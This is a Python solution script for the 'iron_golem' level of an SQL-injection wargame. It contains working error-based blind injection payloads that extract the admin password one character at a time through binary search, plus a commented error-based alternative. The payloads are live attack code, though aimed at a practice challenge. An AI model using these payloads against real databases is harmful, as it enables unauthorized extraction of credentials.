#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return 'select id from prob_iron_golem' in args[0]


def main():
    '''
    Iron_Golem

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
    $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(mysqli_error($db)) exit(mysqli_error($db));
    echo "<hr>query : <strong>{$query}</strong><hr><br>";

    $_GET[pw] = addslashes($_GET[pw]);
    $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem"); 
    '''

    url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    payload = "'||if(length(pw)>%s,1,(select 1 union select 2))#"
    param = dict(pw=payload)
    len_of_key = los.find_key_len(url, param, check_func, cook)

    print(len_of_key)

    result = ''
    num_of_requests = 0
    for i in range(1, len_of_key + 1):
        payload = f"'||if(ord(mid(pw,{i},1))<%s,1,(select 1 union select 2))#"
        param = dict(pw=payload)
        left, num_requests = los.find_binary(url, param, check_func,
                                             32, 127, cook)
        print(chr(left))
        result += chr(left)
        num_of_requests += num_requests

    print('num_of_requests:', num_of_requests)

    # Alternative Error-Based SQL injection
    ''' 
    payload = "'||(select concat(floor(rand(33)*2),pw)x from (select 1 union select 2)t group by x having min(0))#"
    '''

    param = dict(pw=result)
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Iron_Golem Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
